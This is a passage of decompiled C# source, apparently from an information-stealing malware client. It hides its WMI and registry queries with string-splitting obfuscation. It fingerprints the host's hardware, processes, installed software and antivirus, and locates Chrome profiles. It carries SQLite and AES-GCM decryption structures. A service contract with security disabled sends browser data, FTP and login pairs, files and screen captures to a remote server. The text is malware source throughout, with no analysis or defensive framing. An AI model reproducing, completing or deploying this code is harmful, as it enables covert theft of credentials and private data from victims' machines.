	public static T GetDelegate<T>(IntPtr arg1) where T : class
	{
		return Marshal.GetDelegateForFunctionPointer(arg1, typeof(T)) as T;
	}
}
public static class SystemInfoHelper
{
	public static Binding CreateBind()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_00da: Expected O, but got Unknown
		//IL_00db: Expected O, but got Unknown
		NetTcpBinding val = new NetTcpBinding();
		val.set_MaxReceivedMessageSize(2147483647L);
		val.set_MaxBufferPoolSize(2147483647L);
		((Binding)val).set_CloseTimeout(TimeSpan.FromMinutes(30.0));
		((Binding)val).set_OpenTimeout(TimeSpan.FromMinutes(30.0));
		((Binding)val).set_ReceiveTimeout(TimeSpan.FromMinutes(30.0));
		((Binding)val).set_SendTimeout(TimeSpan.FromMinutes(30.0));
		val.set_TransferMode((TransferMode)0);
		XmlDictionaryReaderQuotas val2 = new XmlDictionaryReaderQuotas();
		val2.set_MaxDepth(44567654);
		val2.set_MaxArrayLength(int.MaxValue);
		val2.set_MaxBytesPerRead(int.MaxValue);
		val2.set_MaxNameTableCharCount(int.MaxValue);
		val2.set_MaxStringContentLength(int.MaxValue);
		val.set_ReaderQuotas(val2);
		NetTcpSecurity val3 = new NetTcpSecurity();
		val3.set_Mode((SecurityMode)0);
		MessageSecurityOverTcp val4 = new MessageSecurityOverTcp();
		val4.set_ClientCredentialType((MessageCredentialType)0);
		val3.set_Message(val4);
		val.set_Security(val3);
		return (Binding)val;
	}

	public static List<Entity3> GetProcessors()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		List<Entity3> list = new List<Entity3>();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELSystem.Windows.FormsECT * FRSystem.Windows.FormsOM WinSystem.Windows.Forms32_ProcSystem.Windows.Formsessor".Replace("System.Windows.Forms", string.Empty));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								list.Add(new Entity3
								{
									Id1 = (((ManagementBaseObject)val3).get_Item("Name") as string),
									Id2 = Convert.ToString(((ManagementBaseObject)val3).get_Item("NumberOfCores")),
									Id3 = Entity14.Id1
								});
							}
							catch
							{
							}
						}
						return list;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return list;
		}
	}

	public static List<Entity3> GetGraphicCards()
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		List<Entity3> list = new List<Entity3>();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("roSystem.Linqot\\CISystem.LinqMV2".Replace("System.Linq", string.Empty), "SELSystem.LinqECT * FRSystem.LinqOM WinSystem.Linq32_VideoCoSystem.Linqntroller".Replace("System.Linq", string.Empty));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								uint num = Convert.ToUInt32(((ManagementBaseObject)val3).get_Item("AdapterRAM"));
								if (num != 0)
								{
									list.Add(new Entity3
									{
										Id1 = (((ManagementBaseObject)val3).get_Item("Name") as string),
										Id2 = num.ToString(),
										Id3 = Entity14.Id2
									});
								}
							}
							catch (Exception)
							{
							}
						}
						return list;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<Entity4> GetBrowsers()
	{
		List<Entity4> list = new List<Entity4>();
		try
		{
			RegistryKey val = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
			if (val == null)
			{
				val = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
			}
			string[] subKeyNames = val.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				Entity4 entity = new Entity4();
				RegistryKey val2 = val.OpenSubKey(subKeyNames[i]);
				entity.Id1 = (string)val2.GetValue((string)null);
				RegistryKey val3 = val2.OpenSubKey("shell\\open\\command");
				entity.Id3 = val3.GetValue((string)null).ToString().StripQuotes();
				if (entity.Id3 != null)
				{
					entity.Id2 = FileVersionInfo.GetVersionInfo(entity.Id3).get_FileVersion();
				}
				else
				{
					entity.Id2 = "Unknown Version";
				}
				list.Add(entity);
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string GetSerialNumber()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELESystem.ManagementCT * FRSystem.ManagementOM WiSystem.Managementn32_DisSystem.ManagementkDrivSystem.Managemente".Replace("System.Management", string.Empty));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								return ((ManagementBaseObject)val3).get_Item("SerialNumber") as string;
							}
							catch
							{
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	public static List<string> ListOfProcesses()
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		List<string> list = new List<string>();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELSystem.Text.RegularExpressionsECT * FRSystem.Text.RegularExpressionsOM Win32_PSystem.Text.RegularExpressionsrocess WSystem.Text.RegularExpressionshere SessSystem.Text.RegularExpressionsionId='".Replace("", string.Empty) + Process.GetCurrentProcess().get_SessionId() + "'");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								list.Add(new string(new char[4] { 'I', 'D', ':', ' ' }) + ((ManagementBaseObject)val3).get_Item(new string(new char[9] { 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd' }))?.ToString() + new string(new char[8] { ',', ' ', 'N', 'a', 'm', 'e', ':', ' ' }) + ((ManagementBaseObject)val3).get_Item(new string(new char[4] { 'N', 'a', 'm', 'e' }))?.ToString() + new string(new char[15]
								{
									',', ' ', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L',
									'i', 'n', 'e', ':', ' '
								}) + ((ManagementBaseObject)val3).get_Item(new string(new char[11]
								{
									'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n',
									'e'
								})));
							}
							catch
							{
							}
						}
						return list;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return list;
		}
	}

	public static List<string> GetVs()
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_01bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		List<string> list = new List<string>();
		try
		{
			string[] array = new string(new char[141]
			{
				'A', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'n', 't', 'i', 'v', 'F', 'i', 'l', 'e', 'S',
				'y', 's', 't', 'e', 'm', 'i', 'r', 'u', 's', 'P',
				'r', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'o', 'd', 'u', 'F', 'i', 'l', 'e', 'S', 'y',
				's', 't', 'e', 'm', 'c', 't', '|', 'A', 'n', 't',
				'i', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'S', 'p', 'y', 'W', 'F', 'i', 'l', 'e', 'S',
				'y', 's', 't', 'e', 'm', 'a', 'r', 'e', 'P', 'r',
				'o', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'd', 'u', 'c', 't', '|', 'F', 'i', 'r', 'e',
				'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e', 'm',
				'w', 'a', 'l', 'l', 'P', 'r', 'o', 'd', 'F', 'i',
				'l', 'e', 'S', 'y', 's', 't', 'e', 'm', 'u', 'c',
				't'
			}).Replace("FileSystem", string.Empty).Split(new char[1] { '|' });
			foreach (string text in array)
			{
				try
				{
					ManagementObjectSearcher val = new ManagementObjectSearcher(new string(new char[19]
					{
						'R', 'O', 'O', 'T', '\\', 'S', 'e', 'c', 'u', 'r',
						'i', 't', 'y', 'C', 'e', 'n', 't', 'e', 'r'
					}), new string(new char[14]
					{
						'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F',
						'R', 'O', 'M', ' '
					}) + text);
					try
					{
						ManagementObjectCollection val2 = val.Get();
						try
						{
							ManagementObjectEnumerator enumerator = val2.GetEnumerator();
							try
							{
								while (enumerator.MoveNext())
								{
									ManagementBaseObject current = enumerator.get_Current();
									try
									{
										if (!list.Contains(current.get_Item(new string(new char[11]
										{
											'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
											'e'
										})) as string))
										{
											list.Add(current.get_Item(new string(new char[11]
											{
												'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
												'e'
											})) as string);
										}
									}
									catch
									{
									}
								}
							}
							finally
							{
								((IDisposable)enumerator)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)val2)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch
				{
				}
			}
			array = new string(new char[141]
			{
				'A', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'n', 't', 'i', 'v', 'F', 'i', 'l', 'e', 'S',
				'y', 's', 't', 'e', 'm', 'i', 'r', 'u', 's', 'P',
				'r', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'o', 'd', 'u', 'F', 'i', 'l', 'e', 'S', 'y',
				's', 't', 'e', 'm', 'c', 't', '|', 'A', 'n', 't',
				'i', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'S', 'p', 'y', 'W', 'F', 'i', 'l', 'e', 'S',
				'y', 's', 't', 'e', 'm', 'a', 'r', 'e', 'P', 'r',
				'o', 'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e',
				'm', 'd', 'u', 'c', 't', '|', 'F', 'i', 'r', 'e',
				'F', 'i', 'l', 'e', 'S', 'y', 's', 't', 'e', 'm',
				'w', 'a', 'l', 'l', 'P', 'r', 'o', 'd', 'F', 'i',
				'l', 'e', 'S', 'y', 's', 't', 'e', 'm', 'u', 'c',
				't'
			}).Replace("FileSystem", string.Empty).Split(new char[1] { '|' });
			foreach (string text2 in array)
			{
				try
				{
					ManagementObjectSearcher val3 = new ManagementObjectSearcher(new string(new char[20]
					{
						'R', 'O', 'O', 'T', '\\', 'S', 'e', 'c', 'u', 'r',
						'i', 't', 'y', 'C', 'e', 'n', 't', 'e', 'r', '2'
					}), new string(new char[14]
					{
						'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F',
						'R', 'O', 'M', ' '
					}) + text2);
					try
					{
						ManagementObjectCollection val4 = val3.Get();
						try
						{
							ManagementObjectEnumerator enumerator = val4.GetEnumerator();
							try
							{
								while (enumerator.MoveNext())
								{
									ManagementBaseObject current2 = enumerator.get_Current();
									try
									{
										if (!list.Contains(current2.get_Item(new string(new char[11]
										{
											'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
											'e'
										})) as string))
										{
											list.Add(current2.get_Item(new string(new char[11]
											{
												'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
												'e'
											})) as string);
										}
									}
									catch
									{
									}
								}
							}
							finally
							{
								((IDisposable)enumerator)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)val4)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val3)?.Dispose();
					}
				}
				catch
				{
				}
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<string> GetProcessesByName(string name, string ext)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		List<string> list = new List<string>();
		try
		{
			name += ext;
			ManagementObjectSearcher val = new ManagementObjectSearcher("SSystem.ELECT * FRSystem.OM WiSystem.n32_ProcSystem.ess WherSystem.e SessiSystem.onId='".Replace("System.", string.Empty) + Process.GetCurrentProcess().get_SessionId() + "'");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								if (((ManagementBaseObject)val3).get_Item(new string(new char[4] { 'N', 'a', 'm', 'e' }))?.ToString() == name)
								{
									list.Add(((ManagementBaseObject)val3).get_Item("ExecutablePath")?.ToString());
								}
							}
							catch
							{
							}
						}
						return list;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return list;
		}
	}

	public static List<string> ListOfPrograms()
	{
		List<string> list = new List<string>();
		try
		{
			string text = new string(new char[51]
			{
				'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M',
				'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W',
				'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r',
				'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o',
				'n', '\\', 'U', 'n', 'i', 'n', 's', 't', 'a', 'l',
				'l'
			});
			RegistryKey val = Registry.LocalMachine.OpenSubKey(text);
			try
			{
				string[] subKeyNames = val.GetSubKeyNames();
				foreach (string text2 in subKeyNames)
				{
					try
					{
						RegistryKey val2 = val.OpenSubKey(text2);
						try
						{
							string text3 = (string)((val2 != null) ? val2.GetValue(new string(new char[11]
							{
								'D', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
								'e'
							})) : null);
							string text4 = (string)((val2 != null) ? val2.GetValue(new string(new char[14]
							{
								'D', 'i', 's', 'p', 'l', 'a', 'y', 'V', 'e', 'r',
								's', 'i', 'o', 'n'
							})) : null);
							if (!string.IsNullOrEmpty(text3) && !string.IsNullOrWhiteSpace(text4))
							{
								text3 = text3.Trim();
								text4 = text4.Trim();
								list.Add(Regex.Replace(text3 + " [" + text4 + "]", new string(new char[16]
								{
									'[', '^', '\\', 'u', '0', '0', '2', '0', '-', '\\',
									'u', '0', '0', '7', 'F', ']'
								}), string.Empty));
							}
						}
						finally
						{
							((IDisposable)val2)?.Dispose();
						}
					}
					catch
					{
					}
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return list.OrderBy((string x) => x).ToList();
	}

	public static List<string> AvailableLanguages()
	{
		List<string> result = new List<string>();
		try
		{
			return (from InputLanguage lang in (IEnumerable)InputLanguage.get_InstalledInputLanguages()
				select lang.get_Culture().EnglishName).ToList();
		}
		catch
		{
			return result;
		}
	}

	public static string CollectMemory()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		string result = "Concat0 MConcatb oConcatr Concat0".Replace("Concat", string.Empty);
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELEMemoryCT * FMemoryROM WiMemoryn32_OperMemoryatingSMemoryystem".Replace("Memory", string.Empty));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								double num = Convert.ToDouble(((ManagementBaseObject)val3).get_Item(new string(new char[22]
								{
									'T', 'o', 't', 'a', 'l', 'V', 'i', 's', 'i', 'b',
									'l', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 'i',
									'z', 'e'
								})));
								double num2 = num * 1024.0;
								double num3 = Math.Round(num / 1024.0, 2);
								result = $"{num3}{new string(new char[7] { ' ', 'M', 'B', ' ', 'o', 'r', ' ' })}{num2}".Replace(',', '.');
							}
							catch
							{
							}
						}
						return result;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return result;
		}
	}

	public static string GetWindowsVersion()
	{
		try
		{
			string text;
			try
			{
				text = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
			}
			catch (Exception)
			{
				text = "x86";
			}
			string text2 = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
			if (!string.IsNullOrEmpty(text2))
			{
				return text2 + " " + text;
			}
		}
		catch (Exception)
		{
		}
		return string.Empty;
		static string HKLM_GetString(string key, string value)
		{
			try
			{
				RegistryKey obj = Registry.LocalMachine.OpenSubKey(key);
				return ((obj != null) ? obj.GetValue(value).ToString() : null) ?? string.Empty;
			}
			catch
			{
				return string.Empty;
			}
		}
	}
}
[DataContract(Name = "Entity13", Namespace = "Entity")]
public enum Entity13 : byte
{
	[EnumMember]
	Id1,
	[EnumMember]
	Id2,
	[EnumMember]
	Id3,
	[EnumMember]
	Id4
}
public class FileCopier
{
	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Expected O, but got Unknown
		List<string> list = new List<string>();
		list.Add(new string(new char[9] { '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\' }));
		list.Add(new string(new char[15]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
			'i', 'l', 'e', 's', '\\'
		}));
		list.Add(new string(new char[21]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
			'i', 'l', 'e', 's', ' ', '(', 'x', '8', '6', ')',
			'\\'
		}));
		list.Add(new string(new char[14]
		{
			'\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'D',
			'a', 't', 'a', '\\'
		}));
		List<string> list2 = new List<string>();
		if (files == null || files.Length == 0 || level > maxLevel)
		{
			return list2;
		}
		try
		{
			string[] directories = Directory.GetDirectories(baseDirectory);
			foreach (string text in directories)
			{
				bool flag = false;
				foreach (string item in list)
				{
					if (text.Contains(item))
					{
						flag = true;
						break;
					}
				}
				if (flag)
				{
					continue;
				}
				try
				{
					DirectoryInfo val = new DirectoryInfo(text);
					FileInfo[] files2 = val.GetFiles();
					bool flag2 = false;
					for (int j = 0; j < files2.Length; j++)
					{
						if (flag2)
						{
							break;
						}
						for (int k = 0; k < files.Length; k++)
						{
							if (flag2)
							{
								break;
							}
							string obj = files[k];
							FileInfo val2 = files2[j];
							if (obj == ((FileSystemInfo)val2).get_Name())
							{
								flag2 = true;
								list2.Add(((FileSystemInfo)val2).get_FullName());
							}
						}
					}
					foreach (string item2 in FindPaths(((FileSystemInfo)val).get_FullName(), maxLevel, level + 1, files))
					{
						if (!list2.Contains(item2))
						{
							list2.Add(item2);
						}
					}
					val = null;
				}
				catch
				{
				}
			}
			return list2;
		}
		catch
		{
			return list2;
		}
	}

	public static string ChromeGetName(string path)
	{
		try
		{
			string[] array = path.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			if (array[^2].Contains(new string(new char[9] { 'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a' })))
			{
				return array[^1];
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string ChromeGetRoamingName(string path)
	{
		try
		{
			return path.Split(new string[1]
			{
				new string(new char[16]
				{
					'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'R', 'o',
					'a', 'm', 'i', 'n', 'g', '\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
		}
		catch
		{
		}
		return string.Empty;
	}

	public static string ChromeGetLocalName(string path)
	{
		try
		{
			string[] array = path.Split(new string[1]
			{
				new string(new char[14]
				{
					'A', 'p', 'p', 'D', 'a', 't', 'a', '\\', 'L', 'o',
					'c', 'a', 'l', '\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			return array[0] + "_[" + array[1] + "]";
		}
		catch
		{
		}
		return string.Empty;
	}
}
[DataContract(Name = "Entity16", Namespace = "Entity")]
public class Entity16
{
	[DataMember(Name = "Id5")]
	public string Id5 { get; set; }

	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public bool Id3 { get; set; }
}
public abstract class FileScanner
{
	public string Name { get; set; }

	public abstract string GetFolder(Entity16 scannerArg, FileInfo filePath);

	public abstract IEnumerable<Entity16> GetScanArgs();
}
[DataContract(Name = "Entity17", Namespace = "Entity")]
public class Entity17
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public IEnumerable<Entity16> Id3 { get; set; }
}
[ServiceContract(/*Could not decode attribute arguments.*/)]
public interface Entity
{
	[OperationContract(Name = "Id1")]
	bool Id1();

	[OperationContract(Name = "Id2")]
	Entity2 Id2();

	[OperationContract(Name = "Id3")]
	void Id3(Entity7 user);

	[OperationContract(Name = "Id4")]
	Entity13 Id4(Entity7 user);

	[OperationContract(Name = "Id5")]
	Entity13 Id5(byte[] display);

	[OperationContract(Name = "Id6")]
	Entity13 Id6(List<string> defenders);

	[OperationContract(Name = "Id7")]
	Entity13 Id7(List<string> languages);

	[OperationContract(Name = "Id8")]
	Entity13 Id8(List<string> softwares);

	[OperationContract(Name = "Id9")]
	Entity13 Id9(List<string> processes);

	[OperationContract(Name = "Id10")]
	Entity13 Id10(List<Entity3> hardwares);

	[OperationContract(Name = "Id11")]
	Entity13 Id11(List<Entity9> browsers);

	[OperationContract(Name = "Id12")]
	Entity13 Id12(List<Entity12> ftps);

	[OperationContract(Name = "Id13")]
	Entity13 Id13(List<Entity4> installedBrowsers);

	[OperationContract(Name = "Id14")]
	Entity13 Id14(List<Entity5> remoteFiles);

	[OperationContract(Name = "Id15")]
	Entity13 Id15(List<Entity5> remoteFiles);

	[OperationContract(Name = "Id16")]
	Entity13 Id16(List<Entity5> remoteFiles);

	[OperationContract(Name = "Id17")]
	Entity13 Id17(List<Entity12> loginPairs);

	[OperationContract(Name = "Id18")]
	Entity13 Id18(List<Entity5> remoteFiles);

	[OperationContract(Name = "Id19")]
	Entity13 Id19(List<Entity5> remoteFiles);

	[OperationContract(Name = "Id20")]
	Entity13 Id20(List<Entity5> remoteFiles);

	[OperationContract(Name = "Id21")]
	Entity13 Id21(List<Entity5> remoteFiles);

	[OperationContract(Name = "Id22")]
	void Id22();

	[OperationContract(Name = "Id23")]
	IList<Entity6> Id23(Entity7 user);

	[OperationContract(Name = "Id24")]
	void Id24(Entity7 user, int updateId);
}
public struct RecordHeaderField
{
	public long Size;

	public long Type;
}
public struct SqliteMasterEntry
{
	public string ItemName;

	public long RootNum;

	public string SqlStatement;
}
public struct TableEntry
{
	public string[] Content;
}
[DataContract(Name = "Entity8", Namespace = "Entity")]
public class Entity8
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }
}
[DataContract(Name = "Entity9", Namespace = "Entity")]
public class Entity9
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public IList<Entity12> Id3 { get; set; }

	[DataMember(Name = "Id4")]
	public IList<Entity8> Id4 { get; set; }

	[DataMember(Name = "Id5")]
	public IList<Entity11> Id5 { get; set; }

	[DataMember(Name = "Id6")]
	public IList<Entity10> Id6 { get; set; }

	public bool Id7()
	{
		bool result = true;
		IList<Entity8> id = Id4;
		if (id != null && id.Count > 0)
		{
			result = false;
		}
		IList<Entity10> id2 = Id6;
		if (id2 != null && id2.Count > 0)
		{
			result = false;
		}
		IList<Entity11> id3 = Id5;
		if (id3 != null && id3.Count > 0)
		{
			result = false;
		}
		IList<Entity12> id4 = Id3;
		if (id4 != null && id4.Count > 0)
		{
			result = false;
		}
		return result;
	}
}
[DataContract(Name = "Entity10", Namespace = "Entity")]
public class Entity10
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public bool Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public string Id3 { get; set; }

	[DataMember(Name = "Id4")]
	public bool Id4 { get; set; }

	[DataMember(Name = "Id5")]
	public long Id5 { get; set; }

	[DataMember(Name = "Id6")]
	public string Id6 { get; set; }

	[DataMember(Name = "Id7")]
	public string Id7 { get; set; }

	public Entity10()
	{
	}

	public Entity10(string expires)
	{
		Id5 = long.Parse(expires);
	}
}
[DataContract(Name = "Entity11", Namespace = "Entity")]
public class Entity11
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public int Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public int Id3 { get; set; }

	[DataMember(Name = "Id4")]
	public string Id4 { get; set; }
}
[DataContract(Name = "Entity12", Namespace = "Entity")]
public class Entity12
{
	[DataMember(Name = "Id1")]
	public string Id1 { get; set; }

	[DataMember(Name = "Id2")]
	public string Id2 { get; set; }

	[DataMember(Name = "Id3")]
	public string Id3 { get; set; }
}
public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
{
	public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

	public int cbSize;

	public int dwInfoVersion;

	public IntPtr pbNonce;

	public int cbNonce;

	public IntPtr pbAuthData;

	public int cbAuthData;

	public IntPtr pbTag;

	public int cbTag;

	public IntPtr pbMacContext;

	public int cbMacContext;

	public int cbAAD;

	public long cbData;

	public int dwFlags;

	public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
	{
		this = default(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
		dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
		cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
		if (iv != null)
		{
			cbNonce = iv.Length;
			pbNonce = Marshal.AllocHGlobal(cbNonce);
			Marshal.Copy(iv, 0, pbNonce, cbNonce);
		}
		if (aad != null)
		{
			cbAuthData = aad.Length;
			pbAuthData = Marshal.AllocHGlobal(cbAuthData);
			Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
		}
		if (tag != null)
		{
			cbTag = tag.Length;
